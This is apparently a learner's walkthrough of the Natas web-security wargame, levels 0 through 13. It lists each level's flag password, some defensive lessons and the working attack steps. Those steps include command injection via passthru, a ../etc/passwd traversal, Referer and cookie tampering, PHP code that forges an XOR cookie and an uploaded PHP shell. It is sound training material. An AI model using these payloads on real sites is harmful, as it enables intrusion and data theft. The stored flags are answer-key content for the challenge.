natas0 -> natas1
- look at source code
- never put valuable stuff in source code!

natas1 -> natas2
- look at source code, again
- never rely on JavaScript for security!

natas2 -> natas3
- source code indicates a pixel image with a path /files/
- seems like the directory is browsable 
- don't put proprietary stuff in the browsable directories!

natas3 -> natas4  
- access disallowed part of server using robots.txt
- robots.txt disallows stuff to appear in search engines (malware no no!), not a place for hiding stuff!
[Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ]

natas4 -> natas5
- only user coming from natas5 can view the page
- need to modify packets (use Tamper Data)
- start tamper > tamper the get request > change referral > right click to replay > submit
- never trust what the client sends you! referer comes from the client side, up to client's control!
[iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq ]

natas5 -> natas6
- not logged in? why???
- suspect: cookies!
- never trust what the client sends you, again! Cookie poisoning, modifies cookie contents to bypass security.
- export a cookie, and use it on another machine? Gruyere lesson!
[aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1]

natas6 -> natas7
- secrets again..?  view sourcecode!
- seems like there's a directory..hmmm~ 
- blank page? do the usual, sourcecode!
- be careful with the directories. Maybe force parameter extensions when necessary.
[7z3hEENjQtflzgnT29q7wAvMNfZdh0i9]

natas7 -> natas8
- do the usual..page source!
- /etc/passwds are rather common places to store passes
- some people want to explore the files outside of webpages...and by typing http://www.example.com/index.php?file=../../../etc/passwd
- Local File Inclusion attack [LFI]
[DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe]

natas8 -> natas9
- view page source!
- see coding? encryption? no worries~
- Given: bin2hex(strrev(base64_encode($secret))); [encode in base64, reversed, encode in bin2hex]
- fire up a php compiler and write the code in reverse! echo base64_decode (strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
- don't worry about not knowing how to code, sometimes it's just logic.
[W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl]

natas9 -> natas10
- view page source!
- something catches your eye [passthru("grep -i $key dictionary.txt");]
- find out what it means? grep prints patterns and stuff... -i means ignore-case... search through dictionary.txt
- passthru is a PHP command for executing external programs. (web browser)
- ; cat /etc/natas_webpass/natas10 [semicolon to terminate grep and use cat] [cat open text file and read its contents]
[nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu]

natas10 -> natas11
- page source! preg_match to filter some characters
- cannot use semicolon already so we use other stuff
- as you know, the trailer of the url...is at the end of line. so we use special char $ to tell grep search end of line
- .* can be used to match every filename in given directory
- check out "http://tldp.org/LDP/abs/html/special-chars.html"
[U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK]

natas11 -> natas12
- XOR encryption is used. So we try to figure out how to decrypt the XOR
- source code given, do some code auditing! [google how XOR works, plaintext^key = ciphertext] play around with it :)
- the code shows that cookie(data) is encrypted with XOR, so we try to find the cookie content [cookie manager]
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
- cookie content generated by XOR encrypting an array with the $defaultdata
- now we throw it around... plaintext^ciphertext= key

A XOR key = C ...now... A XOR C = key  [where C is the cookie content; A is the json] 
function xor_decrypt($in) {
$key = $in;
$text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
$outText = '';
// Iterate through each character
for($i=0;$i<strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}
return $outText;
}
$in = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
echo (xor_decrypt($in));  #do it in reverse!
?>

When you get your key. You try getting the plaintext using the key!
C XOR key = A
- set showpassword to yes [to show plaintext]
then you do it the normal way  XOR then base64encode it
$in = xor_decrypt("qw8J");
echo (base64_encode($in));
[ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK] edit in cookie content, this is new cookie to get natas12 pass!
[EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3]


natas12 ->natas13
- upload a jpg file? really?
- remote file inclusion exploit: allows attacker to include a remote file through a script (no proper validation on user input)
-source code indicates that once we upload the file, a link will be given to the file
- now we upload a small php script that will bring us to where they store the webpass (indicated in main page)
<?php
passthru ("cat /etc/natas_webpass/natas13");
?>
[jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY]

natas13 -> natas14